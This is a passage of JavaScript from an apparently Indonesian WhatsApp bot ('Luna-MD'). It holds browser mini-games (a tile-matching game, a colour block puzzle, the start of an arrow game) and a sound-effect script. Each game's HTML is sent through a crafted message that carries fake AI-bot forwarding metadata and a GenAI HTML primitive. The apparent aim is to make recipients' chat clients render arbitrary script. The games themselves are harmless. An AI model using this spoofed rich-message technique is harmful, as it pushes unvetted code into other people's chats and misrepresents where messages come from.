note('Bukan pasangan!');sBad();
pick(t);sSel();
}
}
function shake(t){if(!t.el)return;t.el.classList.add('hnt');setTimeout(function(){t.el.classList.remove('hnt')},950)}
function refresh(){tiles.forEach(function(t){if(t.el&&!t.out)t.el.classList.toggle('blk',!free(t))})}
function anyMove(){
var F=[],i,j;
for(i=0;i<tiles.length;i++)if(!tiles[i].out)F.push([tiles[i],free(tiles[i])]);
for(i=0;i<F.length;i++){if(!F[i][1])continue;
for(j=i+1;j<F.length;j++)if(F[j][1]&&F[i][0].face===F[j][0].face)return true}
return false}
function note(s){msgEl.textContent=s}
function startTicker(){if(timer)return;timer=setInterval(function(){secs++;tmEl.textContent=fmtT(secs);save()},1000)}
function startTimer(){started=true;if(!startedAt)startedAt=Date.now();startTicker()}
function pauseTimer(){clearInterval(timer);timer=null}

function ensureMoves(min){
var made=0,guard=0;
while(made<min&&guard++<90){
var F=[],i;
for(i=0;i<tiles.length;i++)if(!tiles[i].out&&free(tiles[i]))F.push(tiles[i]);
if(F.length<2)break;
var a=F[Math.floor(Math.random()*F.length)];
var b=F[Math.floor(Math.random()*F.length)];
if(b===a)continue;
if(a.face===b.face){made++;continue}
var tw=null,t;
for(i=0;i<tiles.length;i++){t=tiles[i];
if(!t.out&&t!==a&&t!==b&&t.face===a.face){tw=t;break}}
if(!tw)continue;
var tmp=b.face;b.face=a.face;tw.face=tmp;
setFace(b);setFace(tw);
made++;
}
refresh();upd();
return anyMove();
}
function autoShuffle(){
if(OVER||dealing)return;
if(sel>=0){unpick(tiles[sel]);sel=-1}
note('Gak ada langkah — diacak otomatis! 🔀');
asfEl.classList.add('on');sShuf();
setTimeout(function(){doReshuffle();asfEl.classList.remove('on')},700);
}
function doReshuffle(){
var L=[],i,att;
for(i=0;i<tiles.length;i++)if(!tiles[i].out)L.push(tiles[i]);
for(att=0;att<3;att++){
var fs=sh(L.map(function(t){return t.face}));
for(i=0;i<L.length;i++){L[i].face=fs[i];setFace(L[i])}
if(ensureMoves(3))break;
}
if(sel>=0){unpick(tiles[sel]);sel=-1}
refresh();upd();
if(anyMove()){note('Dapat langkah! Lanjut 💪')}
else{emergencySwap();note('Diacak paksa! 🔧')}
save();
}
function emergencySwap(){
var cov=[],fr=[],i,t;
for(i=0;i<tiles.length;i++){t=tiles[i];if(t.out)continue;
if(covered(t))cov.push(t);else if(free(t))fr.push(t)}
if(cov.length&&fr.length){
var c=cov[Math.floor(Math.random()*cov.length)],f=fr[Math.floor(Math.random()*fr.length)];
var a=c.x,b=c.y,q=c.z;
c.x=f.x;c.y=f.y;c.z=f.z;f.x=a;f.y=b;f.z=q;
render(false);
}
}

function startGame(si,saved,deal,msgTxt,dIdx){
clearInterval(timer);timer=null;clearTimeout(winTO);nextPending=false;
winEl.classList.remove('on');asfEl.classList.remove('on');
OVER=false;hist=[];sel=-1;dealing=false;
if(dIdx>=0&&dIdx<3)diff=dIdx;
if(si>=0&&si<SHAPES.length)shapeIdx=si;
var pos=SHAPES[shapeIdx]();
var n=pos.length;while(n%2)n--;pos=pos.slice(0,n);
if(saved&&(saved.faces.length!==pos.length))saved=null;
var deck=saved?saved.faces:fitDeck(n);
tiles=[];
for(var i=0;i<pos.length;i++){
var p=saved?saved.slots[i]:pos[i];
tiles.push({i:i,face:deck[i],x:p.x,y:p.y,z:p.z,el:null,out:saved?!!saved.out[i]:false,zi:0});
}
if(!saved)ensureMoves(2);
if(saved&&saved.started&&!saved.over){
started=true;
startedAt=saved.startedAt||(Date.now()-(saved.secs||0)*1000);
secs=Math.max(saved.secs||0,Math.floor((Date.now()-startedAt)/1000));
tmEl.textContent=fmtT(secs);
startTicker();
note('Sesi dilanjutkan — waktu tetap berjalan!');
}else{
started=false;startedAt=null;secs=0;tmEl.textContent='0:00';
}
if(saved){round=saved.round||1;diff=saved.diff||diff}
else{round++;rdEl.textContent=round}
render(deal&&!saved);
if(deal&&!saved){
dealing=true;sDeal();
note(msgTxt||('🏗️ Menata '+tiles.length+' tile…'));
setTimeout(function(){
var ch=boardEl.children,i;
for(i=0;i<ch.length;i++)ch[i].classList.remove('deal');
dealing=false;
if(OVER)return;
var w=boardEl.clientWidth||0;
if(w&&Math.abs(w-lastW)>3){render(false)}
if(!anyMove())autoShuffle();
else note('Tap 2 tile kembar yang bebas!');
},tiles.length*9+720);
}
save();
}

// ==== MENU (FIX#4: buka/tutup, selalu scrollable) ====
function openMenu(){
pauseTimer();save();
// FIX#4: reset scroll ke atas biar judul selalu kelihatan saat menu dibuka
menuEl.scrollTop=0;
var hasNow=tiles.length&&!OVER;
var s=hasNow?null:load();
if(hasNow||s){
contB.classList.remove('off');
if(hasNow)contTxt.textContent=DIFFS[diff].name+' · Ronde '+round+' · '+fmtT(secs);
else contTxt.textContent=DIFFS[s.diff].name+' · Ronde '+(s.round||1);
}else{contB.classList.add('off')}
menuEl.classList.add('on');
}
function closeMenu(){menuEl.classList.remove('on')}
contB.addEventListener('pointerdown',function(e){e.preventDefault();ac();sSel();closeMenu();
if(!tiles.length){var s=load();if(s){startGame(s.shape,s,false);return}}
if(started&&!OVER)startTicker();
note('Lanjut! 👊');
});
var mbs=document.querySelectorAll('.mbtn[data-d]');
for(var _mi=0;_mi<mbs.length;_mi++){(function(b){
b.addEventListener('pointerdown',function(e){e.preventDefault();ac();sSel();closeMenu();
var d=parseInt(b.getAttribute('data-d'),10);
var opts=DIFFS[d].shapes.slice();
var sIdx=opts[Math.floor(Math.random()*opts.length)];
clearSave();round=0;
startGame(sIdx,null,true,d===0?'🟢 MUDAH · santai!':d===1?'🟡 SEDANG · gas!':'🔴 SULIT · hati-hati! 🔥',d);
});
})(mbs[_mi])}
document.getElementById('menuB').addEventListener('pointerdown',function(e){e.preventDefault();ac();sShuf();openMenu();note('Game dijeda — menu terbuka')});

boardEl.addEventListener('pointerdown',function(e){
e.preventDefault();
if(OVER||dealing||menuEl.classList.contains('on'))return;
var n=e.target;
while(n&&n!==boardEl&&!(n.classList&&n.classList.contains('tile')))n=n.parentNode;
if(!n||n===boardEl||!n.getAttribute)return;
var id=parseInt(n.getAttribute('data-i'),10);
if(!isNaN(id))tap(id);
});

document.getElementById('hintB').addEventListener('pointerdown',function(e){e.preventDefault();
ac();if(OVER||dealing||!tiles.length||menuEl.classList.contains('on'))return;
var F=[],i,j;
for(i=0;i<tiles.length;i++)if(!tiles[i].out)F.push([tiles[i],free(tiles[i])]);
for(i=0;i<F.length;i++){if(!F[i][1])continue;
for(j=i+1;j<F.length;j++){
if(F[j][1]&&F[i][0].face===F[j][0].face){
if(sel>=0){unpick(tiles[sel]);sel=-1}
shake(F[i][0]);shake(F[j][0]);note('Pasangan ini! 💡');sSel();return;
}}}
autoShuffle();
});
document.getElementById('undoB').addEventListener('pointerdown',function(e){e.preventDefault();
ac();if(OVER||dealing||!tiles.length||menuEl.classList.contains('on'))return;
if(!hist.length){note('Belum ada langkah untuk di-undo');return}
var m=hist.pop(),a=tiles[m[0]],b=tiles[m[1]];
a.out=false;b.out=false;
a.el.classList.remove('out');b.el.classList.remove('out');
if(sel>=0){unpick(tiles[sel]);sel=-1}
sShuf();refresh();upd();save();note('Undo! ✓');
});
addEventListener('resize',function(){
clearTimeout(rsT);
rsT=setTimeout(function(){
var w=boardEl.clientWidth||0;
if(!w||dealing)return;
if(Math.abs(w-lastW)>3)render(false);
},260);
});
document.addEventListener('pagehide',save);
document.addEventListener('visibilitychange',function(){if(document.hidden)save()});

function win(){
OVER=true;pauseTimer();sWin();save();
var rec=false;
if(!BEST||secs<BEST){BEST=secs;rec=true;
try{localStorage.setItem('kyoko_best',String(BEST))}catch(e){}
btEl.textContent=fmtT(BEST);
}
winTxt.innerHTML=DIFFS[diff].icon+' '+DIFFS[diff].name+' · Ronde '+round+' selesai dalam <b style="color:#ffd75e">'+fmtT(secs)+'</b>'+(rec?' — REKOR BARU! 🏆':' · Best: '+fmtT(BEST))+'<br><span style="font-size:11px;color:#9fd8b8">ronde baru menyusul…</span>';
winEl.classList.add('on');
var cv=['🎉','✨','🀄','🎊','💫'];
for(var i=0;i<26;i++){(function(k){
var d=document.createElement('div');d.className='cf';
d.textContent=cv[k%cv.length];
d.style.left=Math.random()*94+'vw';
d.style.animationDuration=(2.2+Math.random()*1.8)+'s';
d.style.animationDelay=(Math.random()*.7)+'s';
document.body.appendChild(d);
setTimeout(function(){d.remove()},5200);
})(i)}
nextPending=true;
winTO=setTimeout(nextRound,3400);
}
function nextRound(){
if(!nextPending)return;nextPending=false;
var opts=DIFFS[diff].shapes,s=shapeIdx;
if(opts.length>1){while(s===shapeIdx)s=opts[Math.floor(Math.random()*opts.length)]}
startGame(s,null,true,'Ronde '+(round+1)+' · bentuk '+SNAMES[s]+'! 🀄');
}
document.getElementById('modeB').addEventListener('pointerdown',function(e){e.preventDefault();
ac();sSel();clearTimeout(winTO);nextPending=false;
winEl.classList.remove('on');
openMenu();
});
winEl.addEventListener('pointerdown',function(e){if(nextPending&&e.target.id!=='modeB'){clearTimeout(winTO);nextRound()}});

(function boot(){
rdEl.textContent='-';prEl.textContent='-';
openMenu();
})();
})();
</script>`

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "puzzle": {
const html = `
<style>
:root{
  --ink:#e9edef;
  --ink-soft:#aebac1;
  --muted:#8696a0;
  --accent:#00a884;
  --line:#2a3942;
  --line-strong:#374248;
  --cell-bg:#111b21;
  --card-2:#2a3942;
  --sys:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{background:transparent;color:var(--ink);font-family:var(--sys);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
.stage{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px;}
.card{width:100%;max-width:380px;}
.header{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid var(--line);gap:8px;}
.header__title{font-size:17px;font-weight:600;color:var(--ink);}
.header__sub{font-size:12px;color:var(--muted);}
.status{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;font-size:13px;gap:8px;}
.status__score{display:flex;gap:16px;color:var(--muted);font-size:12px;}
.status__score b{color:var(--ink);}
.board-wrap{position:relative;width:100%;aspect-ratio:9/13;background:var(--cell-bg);border-radius:8px;overflow:hidden;border:1px solid var(--line);}
canvas{width:100%;height:100%;display:block;cursor:pointer;touch-action:none;}
.controls{margin-top:12px;display:flex;flex-direction:column;gap:8px;}
.controls-row{display:flex;gap:8px;justify-content:center;}
.controls button{border:none;border-radius:10px;padding:12px 0;font-size:16px;font-weight:700;color:#0b141a;cursor:pointer;font-family:inherit;letter-spacing:.3px;background:var(--card-2);color:var(--ink);border:1px solid var(--line);flex:1;min-width:50px;}
.controls button:active{filter:brightness(.85);transform:scale(0.95);}
.btn-left{background:linear-gradient(180deg,#f39c12,#d68910);color:#fff !important;}
.btn-right{background:linear-gradient(180deg,#f39c12,#d68910);color:#fff !important;}
.btn-drop{background:linear-gradient(180deg,#55b8ff,#1b7fe0);color:#fff !important;flex:2;}
.btn-reset{background:var(--accent);color:#0b141a !important;border-color:var(--accent) !important;flex:1;}
</style>

<main class="stage">
<div class="card">
<div class="header">
<div class="header__title">🧩 Color Block Puzzle</div>
<div class="header__sub">samakan warna, hancurkan!</div>
</div>
<div class="status">
<div class="status__score">
<span>Skor <b id="score-display">0</b></span>
<span>Level <b id="level-display">1</b></span>
<span>Sisa <b id="lives-display">3</b></span>
</div>
</div>
<div class="board-wrap">
<canvas id="board"></canvas>
</div>
<div class="controls">
<div class="controls-row">
<button class="btn-left" id="btn-left">◀ Kiri</button>
<button class="btn-drop" id="btn-drop">⬇ Jatuhkan</button>
<button class="btn-right" id="btn-right">Kanan ▶</button>
</div>
<div class="controls-row">
<button class="btn-reset" id="btn-reset">🔄 Reset Game</button>
</div>
</div>
</div>
</main>

<script>
const canvas=document.getElementById('board');
const ctx=canvas.getContext('2d');
let W=270,H=390;

const COLS=7;
const ROWS=10;
let cellSize=0;

const COLORS=['#e74c3c','#3498db','#2ecc71','#f1c40f','#9b59b6','#e67e22'];

function resizeCanvas(){
const rect=canvas.getBoundingClientRect();
W=canvas.width=Math.max(240,Math.floor(rect.width));
H=canvas.height=Math.max(340,Math.floor(rect.height));
cellSize=W/COLS;
}

let grid=[];
let activeCol=3;
let activeColor=0;
let nextColor=0;
let score=0,level=1,lives=3,gameOver=false,started=false;
let dropTimer=0,dropInterval=90;
let animParticles=[];
let gameLoopId=null;

function randColor(){return Math.floor(Math.random()*COLORS.length);}

function initGame(){
grid=[];
for(let r=0;r<ROWS;r++){
grid.push(new Array(COLS).fill(-1));
}
const startRows=3;
for(let r=ROWS-startRows;r<ROWS;r++){
for(let c=0;c<COLS;c++){
if(Math.random()<0.75){
grid[r][c]=randColor();
}
}
}
score=0;level=1;lives=3;gameOver=false;started=true;
dropInterval=90;dropTimer=0;
activeCol=Math.floor(COLS/2);
activeColor=randColor();
nextColor=randColor();
animParticles=[];
updateUI();
}

function updateUI(){
document.getElementById('score-display').textContent=score;
document.getElementById('level-display').textContent=level;
document.getElementById('lives-display').textContent=lives;
}

function resetGame(){
if(gameLoopId){cancelAnimationFrame(gameLoopId);gameLoopId=null;}
initGame();
}

function moveLeft(){
if(gameOver||!started)return;
if(activeCol>0)activeCol--;
}
function moveRight(){
if(gameOver||!started)return;
if(activeCol<COLS-1)activeCol++;
}

function findLandingRow(col){
for(let r=0;r<ROWS;r++){
if(grid[r][col]!==-1){
return r-1;
}
}
return ROWS-1;
}

function spawnParticles(col,row,color){
const cx=col*cellSize+cellSize/2;
const cy=row*cellSize+cellSize/2;
for(let i=0;i<8;i++){
const ang=(Math.PI*2*i)/8;
animParticles.push({
x:cx,y:cy,
vx:Math.cos(ang)*3,vy:Math.sin(ang)*3,
life:20,color:COLORS[color]
});
}
}

function clearMatches(col,row){
let cleared=[[col,row]];
let visited=new Set([col+','+row]);
const targetColor=grid[row][col];
let queue=[[col,row]];
while(queue.length){
const [c,r]=queue.shift();
const neighbors=[[c-1,r],[c+1,r],[c,r-1],[c,r+1]];
for(const [nc,nr] of neighbors){
if(nc<0||nc>=COLS||nr<0||nr>=ROWS)continue;
const key=nc+','+nr;
if(visited.has(key))continue;
if(grid[nr][nc]===targetColor){
visited.add(key);
cleared.push([nc,nr]);
queue.push([nc,nr]);
}
}
}
if(cleared.length>=2){
for(const [c,r] of cleared){
spawnParticles(c,r,grid[r][c]);
grid[r][c]=-1;
}
score+=cleared.length*15;
updateUI();
return true;
}
return false;
}

function applyGravity(){
for(let c=0;c<COLS;c++){
let write=ROWS-1;
for(let r=ROWS-1;r>=0;r--){
if(grid[r][c]!==-1){
grid[write][c]=grid[r][c];
if(write!==r)grid[r][c]=-1;
write--;
}
}
for(let r=write;r>=0;r--){
grid[r][c]=-1;
}
}
}

function dropActive(){
if(gameOver||!started)return;
const landRow=findLandingRow(activeCol);
if(landRow<0){
lives--;
updateUI();
if(lives<=0){
gameOver=true;
return;
}
for(let c=0;c<COLS;c++){
for(let r=0;r<3;r++){
grid[r][c]=-1;
}
}
activeColor=nextColor;
nextColor=randColor();
return;
}
grid[landRow][activeCol]=activeColor;
let matched=clearMatches(activeCol,landRow);
if(matched){
applyGravity();
let chainMatched=true;
let safety=0;
while(chainMatched&&safety<20){
chainMatched=false;
safety++;
for(let r=0;r<ROWS;r++){
for(let c=0;c<COLS;c++){
if(grid[r][c]!==-1){
if(clearMatches(c,r)){
chainMatched=true;
applyGravity();
}
}
}
}
}
}
activeColor=nextColor;
nextColor=randColor();

if(score>level*200){
level++;
dropInterval=Math.max(30,dropInterval-8);
}
}

function update(){
if(gameOver||!started)return;

for(let i=animParticles.length-1;i>=0;i--){
const p=animParticles[i];
p.x+=p.vx;p.y+=p.vy;p.life--;
if(p.life<=0)animParticles.splice(i,1);
}

dropTimer++;
if(dropTimer>=dropInterval){
dropTimer=0;
dropActive();
}

for(let c=0;c<COLS;c++){
if(grid[0][c]!==-1&&grid[1]&&grid[1][c]!==-1&&grid[2]&&grid[2][c]!==-1){
let colFull=true;
for(let r=0;r<3;r++){
if(grid[r][c]===-1){colFull=false;break;}
}
if(colFull){
gameOver=true;
return;
}
}
}
}

function drawBlock(x,y,size,color,pulse){
ctx.save();
const pad=2;
const s=pulse?size*0.92:size-pad*2;
const offset=(size-s)/2;
const grad=ctx.createLinearGradient(x+offset,y+offset,x+offset,y+offset+s);
grad.addColorStop(0,color);
grad.addColorStop(1,shadeColor(color,-25));
ctx.fillStyle=grad;
roundRect(x+offset,y+offset,s,s,6);
ctx.fill();
ctx.strokeStyle='rgba(255,255,255,0.25)';
ctx.lineWidth=1.5;
roundRect(x+offset+1,y+offset+1,s-2,s-2,5);
ctx.stroke();
ctx.restore();
}

function shadeColor(hex,percent){
let r=parseInt(hex.slice(1,3),16);
let g=parseInt(hex.slice(3,5),16);
let b=parseInt(hex.slice(5,7),16);
r=Math.max(0,Math.min(255,r+percent));
g=Math.max(0,Math.min(255,g+percent));
b=Math.max(0,Math.min(255,b+percent));
return 'rgb('+r+','+g+','+b+')';
}

function roundRect(x,y,w,h,r){
ctx.beginPath();
ctx.moveTo(x+r,y);
ctx.arcTo(x+w,y,x+w,y+h,r);
ctx.arcTo(x+w,y+h,x,y+h,r);
ctx.arcTo(x,y+h,x,y,r);
ctx.arcTo(x,y,x+w,y,r);
ctx.closePath();
}

function render(){
ctx.clearRect(0,0,W,H);

ctx.fillStyle='#0b141a';
ctx.fillRect(0,0,W,H);

for(let r=0;r<ROWS;r++){
for(let c=0;c<COLS;c++){
ctx.strokeStyle='rgba(255,255,255,0.04)';
ctx.lineWidth=1;
ctx.strokeRect(c*cellSize,r*cellSize,cellSize,cellSize);
if(grid[r][c]!==-1){
drawBlock(c*cellSize,r*cellSize,cellSize,COLORS[grid[r][c]],false);
}
}
}

if(started&&!gameOver){
const landRow=findLandingRow(activeCol);
if(landRow>=0){
ctx.save();
ctx.globalAlpha=0.25;
drawBlock(activeCol*cellSize,landRow*cellSize,cellSize,COLORS[activeColor],false);
ctx.restore();
}
const bob=Math.sin(Date.now()/200)*2;
drawBlock(activeCol*cellSize,2+bob,cellSize,COLORS[activeColor],true);

ctx.save();
ctx.fillStyle='var(--muted)';
ctx.font='10px sans-serif';
ctx.textAlign='left';
ctx.fillText('berikutnya',6,H-8);
ctx.restore();
const nx=W-cellSize*0.7-6;
drawBlock(nx,H-cellSize*0.9,cellSize*0.7,COLORS[nextColor],false);
}

for(const p of animParticles){
ctx.save();
ctx.globalAlpha=Math.max(0,p.life/20);
ctx.fillStyle=p.color;
ctx.beginPath();
ctx.arc(p.x,p.y,3,0,Math.PI*2);
ctx.fill();
ctx.restore();
}

if(gameOver){
ctx.fillStyle='rgba(0,0,0,0.65)';
ctx.fillRect(0,0,W,H);
ctx.fillStyle='#e74c3c';
ctx.font='bold 22px sans-serif';
ctx.textAlign='center';ctx.textBaseline='middle';
ctx.fillText('💀 GAME OVER',W/2,H/2-30);
ctx.fillStyle='#fff';
ctx.font='15px sans-serif';
ctx.fillText('Skor: '+score+' | Level: '+level,W/2,H/2+10);
ctx.fillStyle='#8696a0';
ctx.font='12px sans-serif';
ctx.fillText('Klik 🔄 Reset Game untuk main lagi',W/2,H/2+42);
}

document.getElementById('score-display').textContent=score;
document.getElementById('level-display').textContent=level;
document.getElementById('lives-display').textContent=lives;
}

function gameLoop(){
update();
render();
gameLoopId=requestAnimationFrame(gameLoop);
}

canvas.addEventListener('click',(e)=>{
const rect=canvas.getBoundingClientRect();
const x=(e.clientX-rect.left)*(W/rect.width);
const col=Math.floor(x/cellSize);
if(col<activeCol)moveLeft();
else if(col>activeCol)moveRight();
else dropActive();
});

document.getElementById('btn-left').addEventListener('click',moveLeft);
document.getElementById('btn-right').addEventListener('click',moveRight);
document.getElementById('btn-drop').addEventListener('click',dropActive);
document.getElementById('btn-reset').addEventListener('click',resetGame);

document.addEventListener('keydown',(e)=>{
if(e.key==='ArrowLeft'){e.preventDefault();moveLeft();}
if(e.key==='ArrowRight'){e.preventDefault();moveRight();}
if(e.key===' '||e.key==='ArrowDown'){e.preventDefault();dropActive();}
});

resizeCanvas();
initGame();
window.addEventListener('resize',()=>{resizeCanvas();});
gameLoop();
\n/* RIMURU LIGHT SFX: procedural WebAudio, no external audio asset */
(function(){
  if (window.__RIMURU_LIGHT_SFX__) return;
  var ac=null, master=null, last=0;
  function init(){
    try{
      if(!ac){
        var C=window.AudioContext||window.webkitAudioContext;
        if(!C) return null;
        ac=new C();
        master=ac.createGain();
        master.gain.value=0.055;
        master.connect(ac.destination);
      }
      if(ac.state==='suspended') ac.resume();
      return ac;
    }catch(_){ return null; }
  }
  function tone(freq,dur,type,vol,when){
    var c=init(); if(!c||!master) return;
    var now=c.currentTime+(when||0), o=c.createOscillator(), g=c.createGain();
    o.type=type||'sine';
    o.frequency.setValueAtTime(freq,now);
    g.gain.setValueAtTime(0.0001,now);
    g.gain.exponentialRampToValueAtTime(Math.max(0.0001,vol||0.12),now+0.008);
    g.gain.exponentialRampToValueAtTime(0.0001,now+(dur||0.07));
    o.connect(g); g.connect(master); o.start(now); o.stop(now+(dur||0.07)+0.015);
  }
  function cool(now){
    var t=Date.now(); if(t-last<now) return false; last=t; return true;
  }
  var api={
    init:init,
    tap:function(){ if(cool(28)) tone(520,0.045,'square',0.055); },
    move:function(){ if(cool(24)) tone(300,0.035,'triangle',0.045); },
    rotate:function(){ if(cool(24)) tone(430,0.05,'triangle',0.05); },
    drop:function(){ if(cool(20)) tone(180,0.055,'square',0.05); },
    score:function(){ if(cool(18)) { tone(660,0.055,'sine',0.055); tone(880,0.055,'sine',0.04,0.045); } },
    line:function(){ if(cool(35)) { tone(740,0.06,'sine',0.06); tone(1040,0.09,'sine',0.045,0.05); } },
    win:function(){ if(cool(60)) { tone(523,0.08,'sine',0.06); tone(659,0.08,'sine',0.05,0.07); tone(784,0.12,'sine',0.045,0.14); } },
    over:function(){ if(cool(60)) { tone(392,0.09,'sawtooth',0.055); tone(294,0.12,'sawtooth',0.04,0.08); } }
  };
  window.__RIMURU_LIGHT_SFX__=api;

  function num(el){
    var s=(el.textContent||'').replace(/,/g,'').match(/-?\d+(?:\.\d+)?/);
    return s?Number(s[0]):null;
  }
  function bindValue(el){
    var lastVal=num(el);
    var mo=new MutationObserver(function(){
      var n=num(el);
      if(n===null || lastVal===null){ lastVal=n; return; }
      if(n>lastVal){
        var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
        if(/line|combo|clear|level|stage/.test(id)) api.line(); else api.score();
      } else if(n<lastVal && /life|hp|health|lives|heart/.test(((el.id||'')+' '+(el.className||'')).toLowerCase())) api.over();
      lastVal=n;
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true});
  }
  function bindState(el){
    var prev=(el.textContent||'').toLowerCase(), prevCls=el.className||'';
    var mo=new MutationObserver(function(){
      var txt=(el.textContent||'').toLowerCase(), cls=el.className||'';
      var joined=txt+' '+cls.toLowerCase();
      if(joined!==prev+' '+prevCls.toLowerCase()){
        if(/game over|gameover|kalah|selesai|you lose|lose|mati|gagal|over/.test(joined)) api.over();
        else if(/menang|menang!|you win|winner|victory|berhasil|selamat/.test(joined)) api.win();
        prev=txt; prevCls=cls;
      }
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true,attributes:true,attributeFilter:['class','style','hidden','aria-hidden']});
  }
  document.addEventListener('pointerdown',function(){ api.init(); api.tap(); },{passive:true,capture:true});
  document.addEventListener('keydown',function(e){
    api.init();
    var k=e.key;
    if(/^Arrow(Left|Right|Up|Down)$/.test(k) || /^(a|d|w|s)$/i.test(k)) api.move();
    else if(k===' ' || k==='Enter') api.tap();
  },{passive:true,capture:true});
  document.addEventListener('DOMContentLoaded',function(){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  });
  if(document.readyState!=='loading'){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  }
})();
<\/script>
`;


const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "arrow": {
const html = `<style>
*{
    box-sizing:border-box;
    -webkit-tap-highlight-color:transparent;
    -webkit-user-select:none;
    user-select:none
}

html,body{
    margin:0;
    padding:0;
    width:100%;
    overflow:hidden;
    background:transparent;
    font-family:Arial,sans-serif;
    touch-action:none
}

.aWrap{
    width:100%;
    padding:6px;
    border:2px solid rgba(0, 210, 255, 0.4);
    border-radius:19px;
    background:
        radial-gradient(circle at 50% -20%,rgba(0, 210, 255, .15),transparent 45%),
        linear-gradient(145deg,#1f2240,#101223);
    box-shadow:
        0 5px 25px rgba(0,0,0,.5),
        inset 0 1px 0 rgba(255,255,255,.15)
}

.aHeader{
    height:43px;
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
    border:1px solid rgba(0, 210, 255, .3);
    border-radius:13px;
    margin-bottom:5px;
    background:linear-gradient(180deg,#2b2f52,#15182b);
    overflow:hidden
}

.aTitle{
    color:#fff;
    font:900 20px Arial;
    letter-spacing:2px;
    text-shadow:0 0 8px #00d2ff,0 0 18px rgba(0, 210, 255, .4)
}

.aTitle span{color:#00d2ff}

.aIcon{
    position:absolute;
    font-size:20px;
    filter:drop-shadow(0 0 7px #00d2ff);
    animation:floatIcon 2s ease-in-out infinite
}
.aIcon.left{left:12px}
.aIcon.right{right:12px;animation-delay:.8s}

@keyframes floatIcon{
    0%,100%{transform:translateY(0) rotate(-5deg)}
    50%{transform:translateY(-3px) rotate(5deg)}
}

.aMain{
    position:relative;
    height:340px;
    border:2px solid rgba(0, 210, 255, .3);
    border-radius:14px;
    background:#13152c;
    box-shadow:inset 0 0 40px rgba(0, 210, 255, .06);
    overflow:hidden;
}

#aCanvas{
    display:block;
    width:100%;
    height:100%;
}

.aStats{
    position:absolute;
    z-index:5;
    top:8px;
    left:0;
    right:0;
    text-align:center;
    color:#9ba8c9;
    font:bold 12px monospace;
    pointer-events:none;
}

.aStats span{
    color:#00d2ff;
    font-size: 16px;
    text-shadow: 0 0 5px #00d2ff;
}

.aOverlay{
    position:absolute;
    inset:0;
    z-index:20;
    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;
    background:rgba(8,11,26,.85);
    backdrop-filter:blur(3px);
}

.aOverlay.hide{display:none}

.aOverlayTitle{
    color:white;
    font:900 24px Arial;
    text-shadow:0 0 10px #00d2ff, 0 0 25px #00d2ff;
    margin-bottom:8px;
    letter-spacing:1px;
}

